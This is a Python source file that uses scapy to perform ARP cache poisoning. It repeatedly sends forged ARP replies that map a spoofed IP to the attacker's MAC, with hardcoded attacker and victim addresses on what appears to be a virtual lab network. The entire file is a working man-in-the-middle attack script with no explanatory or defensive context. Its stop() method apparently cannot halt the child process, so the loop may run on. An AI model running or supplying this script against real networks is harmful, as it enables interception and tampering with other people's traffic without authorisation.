from scapy.all import *
import multiprocessing
import time

class ArpPoisoner(multiprocessing.Process):

    def __init__(self, interface):
        multiprocessing.Process.__init__(self)
        self.interface = interface
        self.packet = None
        self.exit = False

    def create_packet(self):

        packet = Ether()/ARP()

        packet[Ether].src = self.mac_attacker
        packet[ARP].hwsrc = self.mac_attacker
        packet[ARP].hwdst = self.mac_victim
        packet[ARP].psrc  = self.ip_to_spoof
        packet[ARP].pdst  = self.ip_victim

        self.packet = packet

    def run(self):

        assert self.packet != None
        
        while not self.exit:
            sendp(self.packet, iface = self.interface)
            time.sleep(1)

    def stop(self):

        self.exit = True


if __name__ == "__main__":
    
    arp_poisoner = ArpPoisoner("enp0s3")

    arp_poisoner.mac_attacker = "08:00:27:cc:08:6f"
    arp_poisoner.mac_victim   = "08:00:27:b7:c4:af"
    arp_poisoner.ip_victim    = "192.168.56.101"
    arp_poisoner.ip_to_spoof  = "192.168.56.102"

    arp_poisoner.create_packet()
    arp_poisoner.start()
    time.sleep(5)
    arp_poisoner.stop()
